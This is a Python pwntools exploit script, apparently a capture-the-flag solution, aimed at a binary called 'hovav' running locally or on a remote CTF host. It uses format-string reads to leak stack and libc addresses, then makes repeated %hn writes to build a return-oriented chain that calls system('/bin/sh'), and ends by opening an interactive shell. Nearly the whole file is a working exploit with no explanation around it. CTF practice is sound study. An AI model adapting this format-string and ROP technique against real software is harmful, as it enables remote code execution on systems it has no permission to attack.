#!/usr/bin/env python
from pwn import *

## "%00007$p" + "AAAAAAAAA"

## 0x555555556124 : "cat fail.txt"


if len(sys.argv) >= 2 :
    p = remote("oakland40ctf.epfl.ch", 40003)
    libc = ELF("./libc6_2.23-0ubuntu11_amd64.so")
    libc_start_main_ret_offset = 0x20830 - 0x20740
else :
    p = process("./hovav")
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
    libc_start_main_ret_offset = 231

p.recvuntil("I'll give you a shot")
p.sendline("%p" + "\x00")
p.recvuntil("0x")
leak_stack = p.recvn(12)
ret_addr_store = int(leak_stack, 16) + (0x7fffffffda20 - 0x7fffffffb320) + 8
print hex(ret_addr_store)


p.recvuntil("I'll give you a shot")
p.sendline("%21$p" + "\x00")
p.recvuntil("0x")
leak_libc = p.recvn(12)
libc_libc_start_main_ret = int(leak_libc, 16)
print "libc_start_main_ret: " + hex(libc_libc_start_main_ret)
libc_p_rdi_ret = libc_libc_start_main_ret - libc_start_main_ret_offset + next(libc.search("\x5f\xc3")) - libc.symbols['__libc_start_main']

libc_system = libc_libc_start_main_ret - libc_start_main_ret_offset + libc.symbols['system'] - libc.symbols['__libc_start_main']

libc_binsh = libc_libc_start_main_ret - libc_start_main_ret_offset + next(libc.search("/bin/sh")) - libc.symbols['__libc_start_main']

## ROP !!
next_ret = ret_addr_store

libc_ret = libc_p_rdi_ret + 1
## ret
payload = "%" + str(libc_ret & 0xffff).rjust(6, "0") + "x" + \
            "%0008$hn" + p64(next_ret)[:7]
p.sendline(payload)
payload = "%" + str((libc_ret >> 16) & 0xffff).rjust(6, "0") + "x" + \
            "%0008$hn" + p64(next_ret + 2)[:7]
p.sendline(payload)
payload = "%" + str((libc_ret >> 32) & 0xffff).rjust(6, "0") + "x" + \
        "%0008$hn" + p64(next_ret + 4)[:7]
p.sendline(payload)
next_ret += 8



## pop %rdi ; ret ;
payload = "%" + str(libc_p_rdi_ret & 0xffff).rjust(6, "0") + "x" + \
            "%0008$hn" + p64(next_ret)[:7]
p.sendline(payload)
payload = "%" + str((libc_p_rdi_ret >> 16) & 0xffff).rjust(6, "0") + "x" + \
            "%0008$hn" + p64(next_ret + 2)[:7]
p.sendline(payload)
payload = "%" + str((libc_p_rdi_ret >> 32) & 0xffff).rjust(6, "0") + "x" + \
        "%0008$hn" + p64(next_ret + 4)[:7]
p.sendline(payload)
next_ret += 8

## &str_bin_sh
arg = ret_addr_store + 8
payload = "%" + str(libc_binsh & 0xffff).rjust(6, "0") + "x" + \
        "%0008$hn" + p64(next_ret)[:7]
p.sendline(payload)
payload = "%" + str((libc_binsh >> 16) & 0xffff).rjust(6, "0") + "x" + \
        "%0008$hn" + p64(next_ret+2)[:7]
p.sendline(payload)
payload = "%" + str((libc_binsh >> 32) & 0xffff).rjust(6, "0") + "x" + \
        "%0008$hn" + p64(next_ret+4)[:7]
p.sendline(payload)
next_ret += 8

## overwrite ret_addr + 16 as &str_bin_sh
arg = ret_addr_store + 16
payload = "%" + str(libc_system & 0xffff).rjust(6, "0") + "x" + \
        "%0008$hn" + p64(next_ret)[:7]
p.sendline(payload)
payload = "%" + str((libc_system >> 16) & 0xffff).rjust(6, "0") + "x" + \
        "%0008$hn" + p64(next_ret+2)[:7]
p.sendline(payload)
payload = "%" + str((libc_system >> 32) & 0xffff).rjust(6, "0") + "x" + \
        "%0008$hn" + p64(next_ret+4)[:7]
p.sendline(payload)



p.sendline("RET" + "\x00")
p.recvrepeat(.5)
#print hex(libc_system)
p.interactive()


